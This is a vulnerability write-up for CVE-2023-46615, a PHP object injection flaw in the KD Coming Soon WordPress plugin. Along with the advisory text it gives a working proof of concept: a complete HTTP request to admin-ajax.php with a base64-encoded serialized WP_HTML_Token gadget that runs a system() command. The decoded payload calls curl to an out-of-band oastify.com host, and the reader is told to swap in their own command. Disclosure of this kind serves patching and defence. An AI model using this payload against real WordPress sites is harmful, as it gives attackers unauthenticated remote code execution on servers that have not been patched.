# CVE-2023-46615
KD Coming Soon &lt;= 1.7 - Unauthenticated PHP Object Injection via cetitle

### Description:
The KD Coming Soon plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 1.7 via deserialization of untrusted input cetitle in the vulnerable kd_cemailer function. This makes it possible for unauthenticated attackers to inject a PHP Object. No POP chain is present in the vulnerable plugin. If a POP chain is present via an additional plugin or theme installed on the target system, it could allow the attacker to delete arbitrary files, retrieve sensitive data, or execute code.

```
Severity: high
CVE ID: CVE-2023-46615
CVSS Score: 8.1
CVSS Metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
Plugin Slug: kd-coming-soon
WPScan URL: https://www.wpscan.com/plugin/kd-coming-soon
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/0f831d48-733a-4e79-8559-92b03b8d0356
```

POC 
--- 
Only works for wordpress 6.4+

```
POST /wp-admin/admin-ajax.php?action=kd_cemailer&nonce=c0465c51ee HTTP/1.1
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 231
Origin: http://wordpress.lan
Connection: close
Referer: http://wordpress.lan/

action=kd_cemailer&cetitle=TzoxMzoiV1BfSFRNTF9Ub2tlbiI6Mjp7czoxMzoiYm9va21hcmtfbmFtZSI7czo0OToiY3VybCB1NHpjNXI5N3B2ZnF1NHgwMXNlenRlbmprYXExZXUyai5vYXN0aWZ5LmNvbSI7czoxMDoib25fZGVzdHJveSI7czo2OiJzeXN0ZW0iO30%3d&email=test%40Test.com
```

urlcode and base64decode `TzoxMzoiV1BfSFRNTF9Ub2tlbiI6Mjp7czoxMzoiYm9va21hcmtfbmFtZSI7czo0OToiY3VybCB1NHpjNXI5N3B2ZnF1NHgwMXNlenRlbmprYXExZXUyai5vYXN0aWZ5LmNvbSI7czoxMDoib25fZGVzdHJveSI7czo2OiJzeXN0ZW0iO30%3d` and replace the curl command `O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:49:"curl u4zc5r97pvfqu4x01seztenjkaq1eu2j.oastify.com";s:10:"on_destroy";s:6:"system";}`
